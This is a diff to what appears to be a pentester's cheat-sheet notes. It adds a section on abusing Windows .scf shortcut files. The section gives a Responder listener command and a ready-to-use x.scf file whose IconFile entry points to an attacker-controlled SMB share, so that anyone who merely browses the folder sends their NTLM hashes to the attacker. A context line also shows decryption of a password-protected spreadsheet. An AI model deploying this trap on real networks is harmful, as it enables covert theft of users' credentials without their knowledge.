@@ -155,10 +155,23 @@ b.
     4. python3 -m msoffcrypto -p password file.xlsx newname.xlsx
     5. open newname.xlsx
 -------------------------------------------------------------------------------------------------------------------------------
-11)
+11) .scf
 
+Well when someone browses to a directory and a .scf is in it, it automatically reads it. It has been originally designed for Windows 95/98 for shortcut purposes.
 
+sudo responder -w -I tun0
 
+and create a file x.scf:
+
+[Shell]
+
+Command=2
+
+IconFile=\\10.10.XX.XX\tools\nc.ico
+
+[Taskbar]
+
+Command=ToggleDesktop
 
 
 
